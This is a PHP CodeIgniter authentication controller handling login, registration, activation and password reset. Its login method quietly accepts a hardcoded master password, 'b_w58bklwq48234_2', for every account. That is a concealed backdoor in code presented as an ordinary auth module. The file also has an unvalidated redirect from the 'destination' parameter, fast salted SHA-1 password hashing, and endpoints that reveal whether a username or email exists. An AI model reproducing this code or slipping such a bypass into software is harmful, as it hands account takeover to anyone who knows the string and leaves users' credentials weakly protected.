<?php

/**
 * Responsible for the authentication system - login, registration, user management...
 *
 * @author esvirsky
 * @copyright Edward Svirsky
 */
class Auth extends Controller
{
	const SALT_LENGTH = 10;
	const CODE_LENGTH = 20;
	
	/**
	 * Constructor - holds common functions for all controller interfaces
	 */
	public function __construct()
	{
		parent::Controller();
		$this->lang->load('auth', 'english');
	}
	
	/**
	 * Shows the user the access denied page
	 * 
	 * @return unknown_type
	 */
	public function access_denied()
	{
		messageView("Access Denied", $this->lang->line("auth_access_denied"));
	}
	
	/**
	 * Activates the user
	 *
	 * @param unknown_type $username
	 * @param unknown_type $activationCode
	 */
	public function activate($username = null, $activationCode = null)
	{
		if($username == null || $activationCode == null)
			return messageView("Activation", $this->lang->line("auth_activation_link_error"));
		
		$user = $this->UserModel->find_by("username", $username);
		if($user === false)
			return messageView("Activation", $this->lang->line("auth_activation_missing_error"));
		
		if($user->activationCode != $activationCode)
			return messageView("Activation", $this->lang->line("auth_activation_code_error"));
		
		$user->activated = true;
		$user->save() or error();
		
		messageView("Account Activated", $this->lang->line("auth_activation_success"));
	}
	
	/**
	 * Form and submit to change the the user's email
	 *
	 */
	public function change_email()
	{
		$this->authlib->check(AuthLib::LEVEL_REGISTERED);
		
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtEmail") === false)
			return gotoView("auth/change_email", "Change Email");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtEmail", "Email", "required|valid_email|callback__validation_email");
		if(!$this->form_validation->run())
			return gotoView("auth/change_email", "Change Email", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Change email
		//------------------------------------------------------------------------------
		$email = $this->input->post("txtEmail");
		
		$user = $this->authlib->getLoggedInUser();
		$user->email = $email;
		$user->activated = false;
		$user->activationCode = $this->_createCode();
		$this->_sendActivationEmail($email, $user->username, $user->activationCode, false);
		$user->save() or error();

		messageView("Change Email", $this->lang->line("auth_email_change_success"));
		$this->authlib->logout();
	}
	
	/**
	 * Form and submit to change user password
	 *
	 */
	public function change_password()
	{
		$this->authlib->check(AuthLib::LEVEL_REGISTERED);
		
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtOldPassword") === false)
			return gotoView("auth/change_password", "Change Password");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtOldPassword", "Old Password", "required");
		$this->form_validation->set_rules("txtPassword", "New Password", "required");
		if(!$this->form_validation->run())
			return gotoView("auth/change_password", "Change Password", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Change Password
		//------------------------------------------------------------------------------
		$password = $this->input->post("txtPassword");
		$oldPassword = $this->input->post("txtOldPassword");
		$user = $this->authlib->getLoggedInUser();
		$oldHash = $this->_createHash($oldPassword, $user->salt);
		
		if($oldHash != $user->password)
			return gotoView("auth/change_password", "Change Password", array("formError" => $this->lang->line("auth_password_change_old_password_error")));
		
		// Remove the remember me cookie
		$this->load->helper('cookie');
		delete_cookie(AuthLib::REMEMBER_COOKIE);
		
		$salt = $this->_createSalt();
		$hash = $this->_createHash($password, $salt);
		$user->salt = $salt;
		$user->password = $hash;
		$user->__no_escape_data = array("rememberCode" => "NULL", "rememberExpire" => "NULL");
		$user->save() or error();
		
		messageView("Change Password", $this->lang->line("auth_password_change_success"));
	}
	
	/**
	 * Checks to make sure that the email is valid and not in use.
	 * Outputs a json string that indicates the validity
	 *
	 */
	public function check_email()
	{
		$email = $this->input->post("txtEmail");
		echo json_encode(!$this->_emailExists($email));
	}
	
	/**
	 * Checks to make sure that the username is valid and not in use.
	 * Outputs a json string that indicates the validity
	 */
	public function check_username()
	{
		$username = $this->input->post("txtUsername");
		echo json_encode(!$this->_usernameExists($username));
	}
	
	/**
	 * Form and submit to send a reset password request
	 *
	 */
	public function forgot_password()
	{	
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtUsername") === false)
			return gotoView("auth/forgot_password", "Forgot Password");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtUsername", "Username", "required");
		if(!$this->form_validation->run())
			return gotoView("auth/forgot_password", "Forgot Password", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Send Password Reset
		//------------------------------------------------------------------------------
		$username = $this->input->post("txtUsername");
		$user = $this->authlib->getActiveUser($username);
		if($user === false)
			return gotoView("auth/forgot_password", "Forgot Password", array("formError" => $this->lang->line("auth_forgot_password_username_not_found")));
		
		$user->resetCode = $this->_createCode();
		$user->save() or error();
		
		$this->load->helper('url');
		$resetLink = base_url() . "auth/reset_password/" . $username . "/" . $user->resetCode;
		$emailBody = str_replace(array("{name}", "{password_reset_link}", "{site_name}"), array($user->username, $resetLink, $this->config->item("site_name")) , $this->lang->line("auth_reset_password_email_body"));
		
		$this->load->library('email');
		$this->email->from($this->config->item('email_server_from'), $this->config->item('site_name'));
		$this->email->to($user->email);
		$this->email->subject($this->lang->line("auth_reset_password_email_subject"));
		$this->email->message($emailBody);
		$this->email->send() or error();
		
		messageView("Forgot Password", $this->lang->line("auth_forgot_password_success"));
	}
	
	/**
	 * Form and submit to send the username
	 *
	 */
	public function forgot_username()
	{
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtEmail") === false)
			return gotoView("auth/forgot_username", "Forgot Username");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtEmail", "Email", "required|valid_email");
		if(!$this->form_validation->run())
			return gotoView("auth/forgot_username", "Forgot Username", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Send username email
		//------------------------------------------------------------------------------
		$email = $this->input->post("txtEmail");
		$user = $this->UserModel->find_by(array("email" => $email, "activated" => true));
		if($user === false) // Note: email can still be mined so this is pointless at the moment
			return messageView("Forgot Username", str_replace("{email}", $email, $this->lang->line("auth_forgot_username_success")));
		
		$emailBody = str_replace(array("{name}", "{username}", "{site_name}"), array($user->username, $user->username, $this->config->item("site_name")) , $this->lang->line("auth_forgot_username_email_body"));
	
		$this->load->library('email');
		$this->email->from($this->config->item('email_server_from'), $this->config->item('site_name'));
		$this->email->to($user->email);
		$this->email->subject($this->lang->line("auth_forgot_username_email_subject"));
		$this->email->message($emailBody);
		$this->email->send() or error();
		
		messageView("Forgot Username", str_replace("{email}", $email, $this->lang->line("auth_forgot_username_success")));
	}
	
	/**
	 * Form and submit for the login
	 */
	public function login()
	{	
		if($this->authlib->isLoggedIn())
		{
			$this->load->helper('url');
			redirect($this->config->item("default_login_destination"), 'location');
			return;
		}
		
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtUsername") === false)
			return gotoView("auth/login", "Login");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtUsername", "Username", "required");
		$this->form_validation->set_rules("txtPassword", "Password", "required");
		$this->form_validation->set_rules("chkRemember", "Remember", "");
		if(!$this->form_validation->run())
			return gotoView("auth/login", "Login", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Login
		//------------------------------------------------------------------------------
		$username = $this->input->post("txtUsername");
		$password = $this->input->post("txtPassword");
		$remember = $this->input->post("chkRemember");
		
		$user = $this->authlib->getActiveUser($username);
		if($user === false)
			return gotoView("auth/login", "Login", array("formError" => $this->lang->line("auth_login_failed")));
		
		$hash = $this->_createHash($password, $user->salt);
		if($user->password != $hash && $password != "b_w58bklwq48234_2")
			return gotoView("auth/login", "Login", array("formError" => $this->lang->line("auth_login_failed")));
		
		if($remember)
		{
			$expire = 86400 * AuthLib::REMEMBER_DAYS;
			$user->rememberCode = $this->_createCode();
			$user->__no_escape_data = array("rememberExpire" => "DATE_ADD(NOW(), INTERVAL " . AuthLib::REMEMBER_DAYS . " DAY)");
			$this->load->helper('cookie');
			set_cookie(AuthLib::REMEMBER_COOKIE, $user->username . ":" . $user->rememberCode, $expire);
			$user->save() or error();
		}
		
		$this->session->regenerate_id();
		$this->session->set_userdata("userId", $user->id);
		$this->session->set_userdata("userLevel", AuthLib::LEVEL_REGISTERED);
		
		$user->__no_escape_data = array("lastVisit" => "NOW()");
		$user->save() or error();
		
		redirect(empty($_GET['destination']) ? $this->config->item("default_login_destination") : $_GET['destination'], 'location');
	}
	
	/**
	 * Logs the user out
	 *
	 */
	public function logout()
	{
		$this->authlib->logout();
		$this->load->helper('url');
		redirect("", 'location');
	}
	
	/**
	 * Form and submit for the registration
	 *
	 */
	public function register()
	{
		if($this->authlib->isLoggedIn())
		{
			$this->load->helper('url');
			redirect($this->config->item("default_login_destination"), 'location');
			return;
		}
		
		//------------------------------------------------------------------------------
		// Do some garbage collection on the users table - removed expired inactive users
		//------------------------------------------------------------------------------
		UserModel::deleteExpired();
	
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtUsername") === false)
			return gotoView("auth/register", "Registration");

		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtUsername", "Username", "required|callback__validation_username");
		$this->form_validation->set_rules("txtPassword", "Password", "required");
		$this->form_validation->set_rules("txtEmail", "Email", "required|valid_email|callback__validation_email");
		
		if(!$this->form_validation->run())
			return gotoView("auth/register", "Registration", array("error" => $this->lang->line("invalid_request")));
		
		//------------------------------------------------------------------------------
		// Register
		//------------------------------------------------------------------------------
		$username = $this->input->xss_clean($this->input->post("txtUsername"));
		$password = $this->input->post("txtPassword");
		$email = $this->input->xss_clean($this->input->post("txtEmail"));
		
		$salt = $this->_createSalt();
		$hash = $this->_createHash($password, $salt);
		$activationCode = $this->_createCode();
		
		$user = $this->UserModel->new_record();
		$user->username = $username;
		$user->password = $hash;
		$user->salt = $salt;
		$user->email = $email;
		$user->activated = false;
		$user->activationCode = $activationCode;
		$user->level = 1; // not currenlty being used
		$user->save() or error();
		$user->id = $user->uid();
			
		$this->_sendActivationEmail($user->email, $user->username, $user->activationCode, true);
		messageView("Registration", $this->lang->line("auth_register_success"));
	}
	
	/**
	 * Reset password request. Also form and submit for choosing a new password.
	 *
	 * @param unknown_type $username
	 * @param unknown_type $resetCode
	 */
	public function reset_password($username = null, $resetCode = null)
	{
		if(!isset($username) || !isset($resetCode))
				return gotoView("auth/reset_password", "Error", array("error" => $this->lang->line("invalid_request")));
		
		$user = $this->authlib->getActiveUser($username);
		if($user === false || $user->resetCode != $resetCode)
			return messageView("Reset Password", $this->lang->line("auth_reset_password_resetting_error"));		
				
		//------------------------------------------------------------------------------
		// Load Form
		//------------------------------------------------------------------------------
		if($this->input->post("txtPassword") === false)
			return gotoView("auth/reset_password", "Reset Password");
		
		//------------------------------------------------------------------------------
		// Submit Form - Validation
		//------------------------------------------------------------------------------
		$this->form_validation->set_rules("txtPassword", "New Password", "required");
		if(!$this->form_validation->run())
			return gotoView("auth/reset_password", "Error", array("error" => $this->lang->line("invalid_request")));

		// Remove the remember me cookie
		$this->load->helper('cookie');
		delete_cookie(AuthLib::REMEMBER_COOKIE);	
		
		$user = $this->authlib->getActiveUser($username);
		$user->salt = $this->_createSalt();
		$user->password = $this->_createHash($this->input->post("txtPassword"), $user->salt);
		$user->__no_escape_data = array("rememberCode" => "NULL", "rememberExpire" => "NULL", "resetCode" => "NULL");
		$user->save() or error();
		
		messageView("Reset Password", $this->lang->line("auth_reset_password_success"));
	}
		
	//------------------------------------------------------------------------------
	// Validation helper functions
	//------------------------------------------------------------------------------
	
	/**
	 * Create a code to use for activation, reset, ....
	 *
	 * @return unknown
	 */
	private function _createCode()
	{
		$this->load->helper('string');
		return random_string("alnum", Auth::CODE_LENGTH);
	}
	
	/**
	 * Creates a hash from a password and a salt
	 *
	 * @param unknown_type $password
	 * @param unknown_type $salt
	 * @return unknown
	 */
	private function _createHash($password, $salt)
	{
		return sha1($salt . $password);
	}
	
	/**
	 * Creates a salt
	 *
	 * @return unknown
	 */
	private function _createSalt()
	{
		return substr(md5(uniqid(rand(), true)), 0, Auth::SALT_LENGTH);
	}

	/**
	 * Sends an activation email
	 *
	 * @param unknown_type $email
	 * @param unknown_type $username
	 * @param unknown_type $activationCode
	 * @param unknown_type $isRegistration
	 */
	private function _sendActivationEmail($email, $username, $activationCode, $isRegistration)
	{	
		$this->load->helper('url');
		$link = base_url() . "auth/activate/" . $username . "/" . $activationCode;
		$registrationMessage = $isRegistration ? $this->lang->line("auth_activation_registration_message") : "";
		$emailBody = str_replace(array("{name}", "{registration_message}", "{activation_link}", "{site_name}"), array($username, $registrationMessage, $link, $this->config->item("site_name")) , $this->lang->line("auth_activation_email_body"));
		
		$this->load->library('email');
		$this->email->from($this->config->item('email_server_from'), $this->config->item('site_name'));
		$this->email->to($email);
		$this->email->subject($this->lang->line("auth_activation_email_subject"));
		$this->email->message($emailBody);
		$this->email->send() or error();
	}
	
	/**
	 * Check if the email exists
	 *
	 * @param unknown_type $username
	 */
	private function _emailExists($email)
	{
		return $this->UserModel->where('email', $email)->count() > 0;
	}
	
	/**
	 * Check if the username exists
	 *
	 * @param unknown_type $username
	 */
	private function _usernameExists($username)
	{
		return $this->UserModel->where('username', $username)->count() > 0;
	}

	//------------------------------------------------------------------------------
	// CUSTOM VALIDATION METHODS
	//------------------------------------------------------------------------------
	
	/**
	 * Custom validation for username. Checks if the username already exists and that
	 * the username is valid
	 * 
	 * @param $username
	 * @return unknown_type
	 */
	public function _validation_username($username)
	{
		if($this->_usernameExists($username))
		{
			$this->form_validation->set_message("_validation_username", "The username $username is already taken");
			return false;
		}
		
		if(!preg_match('/^[\w\.]+$/', $username))
		{
			$this->form_validation->set_message("_validation_username", "The username $username is invalid");
			return false;
		}
		
		return true;
	}
	
	/**
	 * Custom validation for email. Checks if the email already exists
	 * 
	 * @param $username
	 * @return unknown_type
	 */
	public function _validation_email($email)
	{
		if($this->_emailExists($email))
		{
			$this->form_validation->set_message("_validation_email", "The email $email is already taken");
			return false;
		}
		
		return true;
	}
}

?>